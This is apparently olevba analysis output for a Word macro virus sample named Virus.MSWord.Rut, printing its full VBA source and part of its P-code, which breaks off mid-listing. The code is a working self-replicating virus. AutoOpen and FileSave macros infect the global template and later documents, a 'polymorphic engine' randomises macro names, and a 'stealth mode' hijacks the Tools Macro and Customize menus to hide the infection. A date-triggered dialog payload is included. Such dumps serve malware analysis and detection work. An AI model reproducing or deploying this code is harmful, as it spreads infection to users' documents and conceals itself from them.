olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rut
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rut - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Rut - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim I
Dim F$
Dim G$
Dim H$
Dim I_$
ReDim AI__$(0)
Dim J
Dim Rnd_$
Dim K
Dim B1$
Dim B2$
Dim B3$
Dim B4$
Dim B5$
Dim B6$
Dim B7$
Dim B8$
Dim B9$
Dim B0$
Dim Y$
Dim T
Dim dlg As Object
    WordBasic.DisableInput 1
    On Error GoTo -1: On Error GoTo ErrFClose
    Dim Allready: Let Allready = 0
    
    '** Check macros ID in GlobalTemplate
     For I = 1 To WordBasic.CountMacros(0)
      If Len(WordBasic.[MacroName$](I, 0)) = 20 Then
        F$ = Mid(WordBasic.[MacroName$](I, 0), 20, 1)
        G$ = Mid(WordBasic.[MacroName$](I, 0), 1, 1)
        H$ = Mid(WordBasic.[MacroName$](I, 0), 19, 1)
        I_$ = Mid(WordBasic.[MacroName$](I, 0), 2, 1)
        If (F$ = G$) And (H$ = I_$) Then
         Let Allready = -1
        End If
      End If
     Next I
    
    If Not Allready Then
    '** Dilakukan bila global belum tertular
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "Global:FileSave"

    '** Polymorphic engine
       ReDim AI__$(11)
       For J = 1 To WordBasic.CountMacros(1)
       If Len(WordBasic.[MacroName$](J, 1)) = 20 Then
         F$ = Mid(WordBasic.[MacroName$](J, 1), 20, 1)
         G$ = Mid(WordBasic.[MacroName$](J, 1), 1, 1)
         H$ = Mid(WordBasic.[MacroName$](J, 1), 19, 1)
         I_$ = Mid(WordBasic.[MacroName$](J, 1), 2, 1)
         If (F$ = G$) And (H$ = I_$) Then
              Rnd_$ = WordBasic.[MacroName$](J, 1)
              'MsgBox(MacroName$(J, 1))
              For K = 1 To 10
                AI__$(K) = String(1, num)
              Next K
              B1$ = AI__$(1): B2$ = AI__$(2)
              B3$ = AI__$(3): B4$ = AI__$(4)
              B5$ = AI__$(5): B6$ = AI__$(6)
              B7$ = AI__$(7): B8$ = AI__$(8)
              B9$ = AI__$(9): B0$ = AI__$(10)
              Y$ = ""
              For T = 1 To 10
                Y$ = AI__$(T) + Y$
              Next T
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:" + Y$ + B1$ + B2$ + B3$ + B4$ + B5$ + B6$ + B7$ + B8$ + B9$ + B0$

              '* Stealth mode
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ToolsMacro"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ViewToolBars"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:FileTemplates"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ToolsCustomize"
              WordBasic.SaveTemplate
         End If
       End If
      Next J


    Else
         '** Dilakukan bila Global telah tertular
         For J = 1 To WordBasic.CountMacros(0)
          If Len(WordBasic.[MacroName$](J, 0)) = 20 Then
          F$ = Mid(WordBasic.[MacroName$](J, 0), 20, 1)
          G$ = Mid(WordBasic.[MacroName$](J, 0), 1, 1)
          H$ = Mid(WordBasic.[MacroName$](J, 0), 19, 1)
          I_$ = Mid(WordBasic.[MacroName$](J, 0), 2, 1)
           If (F$ = G$) And (H$ = I_$) Then
             'MsgBox("Ialah  " + MacroName$(J, 0))
             Rnd_$ = WordBasic.[MacroName$](J, 0)
             WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave"
             WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
             WordBasic.MacroCopy "Global:" + Rnd_$, WordBasic.[FileName$]() + ":" + Rnd_$

             WordBasic.FileSummaryInfo Update:=1
             Set dlg = WordBasic.DialogRecord.FileSummaryInfo(False)
             WordBasic.CurValues.FileSummaryInfo dlg
             If (dlg.Directory <> "") And (dlg.CreateDate <> "") And (dlg.FileSize <> "0") Then
               WordBasic.FileSaveAs Format:=1
             End If
           End If
          End If
         Next J
 End If

ErrFClose:
    On Error GoTo -1: On Error GoTo 0
    WordBasic.FileSave
    WordBasic.FileSaveAs Format:=1

Succes:
End Sub

Private Function num()
Dim a
Dim b
      a = 65
      b = 90
      num = WordBasic.Int(Rnd() * (b - a) + a)
End Function
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Rut - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim I
Dim F$
Dim G$
Dim H$
Dim I_$
ReDim AI__$(0)
Dim J
Dim Rnd_$
Dim K
Dim B1$
Dim B2$
Dim B3$
Dim B4$
Dim B5$
Dim B6$
Dim B7$
Dim B8$
Dim B9$
Dim B0$
Dim Y$
Dim T
    WordBasic.DisableInput 1
    On Error GoTo -1: On Error GoTo ErrOpen
    Dim Allready
    Let Allready = 0
    

    '** Check macros ID in GlobalTemplate
     For I = 1 To WordBasic.CountMacros(0)
      If Len(WordBasic.[MacroName$](I, 0)) = 20 Then
        F$ = Mid(WordBasic.[MacroName$](I, 0), 20, 1)
        G$ = Mid(WordBasic.[MacroName$](I, 0), 1, 1)
        H$ = Mid(WordBasic.[MacroName$](I, 0), 19, 1)
        I_$ = Mid(WordBasic.[MacroName$](I, 0), 2, 1)
        If (F$ = G$) And (H$ = I_$) Then
         Let Allready = -1
        End If
      End If
     Next I


    If Not Allready Then
      '** Dilakukan bila global belum tertular
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "Global:FileSave"
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"

      '** Polymorphic engine
      ReDim AI__$(11)
      For J = 1 To WordBasic.CountMacros(1)
      If Len(WordBasic.[MacroName$](J, 1)) = 20 Then
        F$ = Mid(WordBasic.[MacroName$](J, 1), 20, 1)
        G$ = Mid(WordBasic.[MacroName$](J, 1), 1, 1)
        H$ = Mid(WordBasic.[MacroName$](J, 1), 19, 1)
        I_$ = Mid(WordBasic.[MacroName$](J, 1), 2, 1)
        If (F$ = G$) And (H$ = I_$) Then
              Rnd_$ = WordBasic.[MacroName$](J, 1)
              'MsgBox(MacroName$(J, 1))
              For K = 1 To 10
                AI__$(K) = String(1, num)
              Next K
              B1$ = AI__$(1): B2$ = AI__$(2)
              B3$ = AI__$(3): B4$ = AI__$(4)
              B5$ = AI__$(5): B6$ = AI__$(6)
              B7$ = AI__$(7): B8$ = AI__$(8)
              B9$ = AI__$(9): B0$ = AI__$(10)
              Y$ = ""
              For T = 1 To 10
                Y$ = AI__$(T) + Y$
              Next T
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:" + Y$ + B1$ + B2$ + B3$ + B4$ + B5$ + B6$ + B7$ + B8$ + B9$ + B0$

              '* Stealth mode
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ToolsMacro"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ViewToolBars"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:FileTemplates"
              WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + Rnd_$, "Global:ToolsCustomize"
              WordBasic.SaveTemplate
        End If
      End If
      Next J

    Else
      '** Dilakukan bila global telah tertular
      For J = 1 To WordBasic.CountMacros(0)
       If Len(WordBasic.[MacroName$](J, 0)) = 20 Then
         F$ = Mid(WordBasic.[MacroName$](J, 0), 20, 1)
         G$ = Mid(WordBasic.[MacroName$](J, 0), 1, 1)
         H$ = Mid(WordBasic.[MacroName$](J, 0), 19, 1)
         I_$ = Mid(WordBasic.[MacroName$](J, 0), 2, 1)
           If (F$ = G$) And (H$ = I_$) Then
             'MsgBox("Ialah  " + MacroName$(J, 0))
             Rnd_$ = WordBasic.[MacroName$](J, 0)
             WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave"
             WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
             WordBasic.MacroCopy "Global:" + Rnd_$, WordBasic.[FileName$]() + ":" + Rnd_$
             WordBasic.FileSaveAs Format:=1
           End If
        End If
      Next J

End If

ErrOpen:
    DVD

End Sub

Private Sub DVD()
Dim Date_
Dim Sc
Dim dlg As Object
Dim Button
Dim Key$
Dim Me_
Dim Text1$, Text2$, Typer$, PassInputKey$
Dim Key1$, Key2$

Let Text1$ = "DVD v1.0. Copyright-1997, DVD Software. Ft-Mesin UNTAR'95"
Let Text2$ = "DJAJA Virus Division"
Let Key1$ = "DJAJA HD-LWP is Good"
Let Key2$ = "I LOVE HD-LWP"


Date_ = WordBasic.Day(WordBasic.Now())
If Date_ = 10 Or Date_ = 18 Or Date_ = 27 Then

Let Sc = WordBasic.Second(WordBasic.Now())
If Sc < 31 Then
 Let Typer$ = Key1$
 Let PassInputKey$ = Key1$
Else
 Let Typer$ = Key2$
 Let PassInputKey$ = Key2$
End If

WordBasic.BeginDialog 320, 92, "Welcome to My World"
    WordBasic.GroupBox 10, 6, 303, 77, ""
    WordBasic.Text 168, 58, 121, 13, "Created by F?D", "Text5"
    WordBasic.Text 168, 22, 125, 13, "DVD version 1.0", "Text1"
    WordBasic.OKButton 23, 24, 127, 21
    WordBasic.PushButton 23, 50, 127, 21, "About DVD", "Push1"
    WordBasic.Text 168, 41, 125, 13, "(C)opyright 1997", "Text2"
    WordBasic.Text 168, 60, 13, 1, "", "Text3"
    Runner (Text1$)
WordBasic.EndDialog

Set dlg = WordBasic.CurValues.UserDialog
Button = WordBasic.Dialog.UserDialog(dlg)

If dlg.Push1 Then
    WordBasic.BeginDialog 320, 80, "About DVD"
     WordBasic.TextBox 11, 26, 302, 18, "TextBox1"
     WordBasic.Text 11, 9, 235, 13, "Type " + Typer$, "Text1"
     WordBasic.OKButton 113, 52, 88, 21
     Runner (Text2$)
    WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog

    Set dlg = WordBasic.CurValues.UserDialog
    Button = WordBasic.Dialog.UserDialog(dlg)
    Key$ = dlg.TextBox1
    If Key$ = PassInputKey$ Then
     WordBasic.BeginDialog 574, 144, "About DVD"
      WordBasic.PushButton 196, 110, 193, 21, "DVD", "Push1"
      WordBasic.Text 19, 11, 361, 13, "Terima kasih telah mengetikkan dengan  benar. ", "Text1"
      WordBasic.Text 19, 29, 513, 13, "Saya dedikasikan kreasi saya ini untuk HD- LWP. Semoga HD-LWP ", "Text2"
      WordBasic.Text 19, 48, 541, 13, "selalu dilindungi oleh-Nya.  Jangan takut DVD tidak akan merusak data", "Text3"
      WordBasic.Text 19, 67, 533, 13, "Anda, apalagi sampai menghapusnya. DVD hanya akan mejeng setiap ", "Text5"
      WordBasic.Text 19, 86, 352, 13, "tanggal-tanggal tertentu saja.  Created by F?D", "Text6"
      WordBasic.Text 19, 67, 352, 1, "", "Text4"
     WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog
    Set dlg = WordBasic.CurValues.UserDialog
    Let Me_ = WordBasic.Dialog.UserDialog(dlg)
    End If
    

 End If
End If
End Sub

Private Sub Runner(Texto$)
Dim I
Dim J
    For I = 1 To (Len(Texto$))
     For J = 1 To 100
     Next J
    WordBasic.PrintStatusBar WordBasic.[Right$](Texto$, I)
    Next I
End Sub

Private Function num()
Dim a
Dim b
      a = 65
      b = 90
      num = WordBasic.Int(Rnd() * (b - a) + a)
End Function
-------------------------------------------------------------------------------
VBA MACRO RUTATHHONRRNOHHTATUR.bas 
in file: Virus.MSWord.Rut - OLE stream: 'Macros/VBA/RUTATHHONRRNOHHTATUR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    WordBasic.DisableInput 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Rut
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/FileSave - 7415 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn I
' Line #3:
' 	Dim 
' 	VarDefn False
' Line #4:
' 	Dim 
' 	VarDefn G
' Line #5:
' 	Dim 
' 	VarDefn H
' Line #6:
' 	Dim 
' 	VarDefn I_
' Line #7:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim AI__$ 0x0001 (As String)
' Line #8:
' 	Dim 
' 	VarDefn J
' Line #9:
' 	Dim 
' 	VarDefn Rnd_
' Line #10:
' 	Dim 
' 	VarDefn K
' Line #11:
' 	Dim 
' 	VarDefn B1
' Line #12:
' 	Dim 
' 	VarDefn B2
' Line #13:
' 	Dim 
' 	VarDefn B3
' Line #14:
' 	Dim 
' 	VarDefn B4
' Line #15:
' 	Dim 
' 	VarDefn B5
' Line #16:
' 	Dim 
' 	VarDefn B6
' Line #17:
' 	Dim 
' 	VarDefn B7
' Line #18:
' 	Dim 
' 	VarDefn B8
' Line #19:
' 	Dim 
' 	VarDefn B9
' Line #20:
' 	Dim 
' 	VarDefn B0
' Line #21:
' 	Dim 
' 	VarDefn Y
' Line #22:
' 	Dim 
' 	VarDefn T
' Line #23:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #24:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #25:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ErrFClose 
' Line #26:
' 	Dim 
' 	VarDefn Allready
' 	BoS 0x0000 
' 	Let 
' 	LitDI2 0x0000 
' 	St Allready 
' Line #27:
' Line #28:
' 	QuoteRem 0x0004 0x0024 "** Check macros ID in GlobalTemplate"
' Line #29:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #30:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	FnLen 
' 	LitDI2 0x0014 
' 	Eq 
' 	IfBlock 
' Line #31:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0014 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St False$ 
' Line #32:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St G$ 
' Line #33:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0013 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St H$ 
' Line #34:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St I_$ 
' Line #35:
' 	Ld False$ 
' 	Ld G$ 
' 	Eq 
' 	Paren 
' 	Ld H$ 
' 	Ld I_$ 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #36:
' 	Let 
' 	LitDI2 0x0001 
' 	UMi 
' 	St Allready 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' Line #41:
' 	Ld Allready 
' 	Not 
' 	IfBlock 
' Line #42:
' 	QuoteRem 0x0004 0x0027 "** Dilakukan bila global belum tertular"
' Line #43:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #44:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #45:
' Line #46:
' 	QuoteRem 0x0004 0x0015 "** Polymorphic engine"
' Line #47:
' 	OptionBase 
' 	LitDI2 0x000B 
' 	Redim AI__$ 0x0001 (As String)
' Line #48:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #49:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	FnLen 
' 	LitDI2 0x0014 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0014 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St False$ 
' Line #51:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St G$ 
' Line #52:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0013 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St H$ 
' Line #53:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St I_$ 
' Line #54:
' 	Ld False$ 
' 	Ld G$ 
' 	Eq 
' 	Paren 
' 	Ld H$ 
' 	Ld I_$ 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #55:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St Rnd_$ 
' Line #56:
' 	QuoteRem 0x000E 0x0018 "MsgBox(MacroName$(J, 1))"
' Line #57:
' 	StartForVariable 
' 	Ld K 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #58:
' 	LitDI2 0x0001 
' 	Ld num 
' 	ArgsLd String$ 0x0002 
' 	Ld K 
' 	ArgsSt AI__$ 0x0001 
' Line #59:
' 	StartForVariable 
' 	Ld K 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	LitDI2 0x0001 
' 	ArgsLd AI__$ 0x0001 
' 	St B1$ 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	ArgsLd AI__$ 0x0001 
' 	St B2$ 
' Line #61:
' 	LitDI2 0x0003 
' 	ArgsLd AI__$ 0x0001 
' 	St B3$ 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	ArgsLd AI__$ 0x0001 
' 	St B4$ 
' Line #62:
' 	LitDI2 0x0005 
' 	ArgsLd AI__$ 0x0001 
' 	St B5$ 
' 	BoS 0x0000 
' 	LitDI2 0x0006 
' 	ArgsLd AI__$ 0x0001 
' 	St B6$ 
' Line #63:
' 	LitDI2 0x0007 
' 	ArgsLd AI__$ 0x0001 
' 	St B7$ 
' 	BoS 0x0000 
' 	LitDI2 0x0008 
' 	ArgsLd AI__$ 0x0001 
' 	St B8$ 
' Line #64:
' 	LitDI2 0x0009 
' 	ArgsLd AI__$ 0x0001 
' 	St B9$ 
' 	BoS 0x0000 
' 	LitDI2 0x000A 
' 	ArgsLd AI__$ 0x0001 
' 	St B0$ 
' Line #65:
' 	LitStr 0x0000 ""
' 	St Y$ 
' Line #66:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #67:
' 	Ld T 
' 	ArgsLd AI__$ 0x0001 
' 	Ld Y$ 
' 	Add 
' 	St Y$ 
' Line #68:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	LitStr 0x0007 "Global:"
' 	Ld Y$ 
' 	Add 
' 	Ld B1$ 
' 	Add 
' 	Ld B2$ 
' 	Add 
' 	Ld B3$ 
' 	Add 
' 	Ld B4$ 
' 	Add 
' 	Ld B5$ 
' 	Add 
' 	Ld B6$ 
' 	Add 
' 	Ld B7$ 
' 	Add 
' 	Ld B8$ 
' 	Add 
' 	Ld B9$ 
' 	Add 
' 	Ld B0$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #70:
' Line #71:
' 	QuoteRem 0x000E 0x000E "* Stealth mode"
' Line #72:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #73:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	LitStr 0x0013 "Global:ViewToolBars"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #74:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #75:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #76:
' 	Ld WordBasic 
' 	ArgsMemCall SaveTemplate 0x0000 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' Line #81:
' Line #82:
' 	ElseBlock 
' Line #83:
' 	QuoteRem 0x0009 0x0027 "** Dilakukan bila Global telah tertular"
' Line #84:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #85:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	FnLen 
' 	LitDI2 0x0014 
' 	Eq 
' 	IfBlock 
' Line #86:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0014 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St False$ 
' Line #87:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St G$ 
' Line #88:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0013 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St H$ 
' Line #89:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St I_$ 
' Line #90:
' 	Ld False$ 
' 	Ld G$ 
' 	Eq 
' 	Paren 
' 	Ld H$ 
' 	Ld I_$ 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #91:
' 	QuoteRem 0x000D 0x0024 "MsgBox("Ialah  " + MacroName$(J, 0))"
' Line #92:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St Rnd_$ 
' Line #93:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #94:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #95:
' 	LitStr 0x0007 "Global:"
' 	Ld Rnd_$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #96:
' Line #97:
' 	LitDI2 0x0001 
' 	ParamNamed Update 
' 	Ld WordBasic 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #98:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSummaryInfo 0x0001 
' 	Set dlg 
' Line #99:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSummaryInfo 0x0001 
' Line #100:
' 	Ld dlg 
' 	MemLd Directory 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld dlg 
' 	MemLd CreateDate 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	And 
' 	Ld dlg 
' 	MemLd FileSize 
' 	LitStr 0x0001 "0"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #101:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #106:
' 	EndIfBlock 
' Line #107:
' Line #108:
' 	Label ErrFClose 
' Line #109:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #110:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #111:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #112:
' Line #113:
' 	Label Succes 
' Line #114:
' 	EndSub 
' Line #115:
' Line #116:
' 	FuncDefn (Private Function num())
' Line #117:
' 	Dim 
' 	VarDefn a
' Line #118:
' 	Dim 
' 	VarDefn B
' Line #119:
' 	LitDI2 0x0041 
' 	St a 
' Line #120:
' 	LitDI2 0x005A 
' 	St B 
' Line #121:
' 	ArgsLd Rnd 0x0000 
' 	Ld B 
' 	Ld a 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Ld a 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St num 
' Line #122:
' 	EndFunc 
' Macros/VBA/AutoOpen - 11663 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn I
' Line #3:
' 	Dim 
' 	VarDefn False
' Line #4:
' 	Dim 
' 	VarDefn G
' Line #5:
' 	Dim 
' 	VarDefn H
' Line #6:
' 	Dim 
' 	VarDefn I_
' Line #7:
' 	OptionBase 
' 	LitDI2 0x0000 
' 	Redim AI__$ 0x0001 (As String)
' Line #8:
' 	Dim 
' 	VarDefn J
' Line #9:
' 	Dim 
' 	VarDefn Rnd_
' Line #10:
' 	Dim 
' 	VarDefn K
' Line #11:
' 	Dim 
' 	VarDefn B1
' Line #12:
' 	Dim 
' 	VarDefn B2
' Line #13:
' 	Dim 
' 	VarDefn B3
' Line #14:
' 	Dim 
' 	VarDefn B4
' Line #15:
' 	Dim 
' 	VarDefn B5
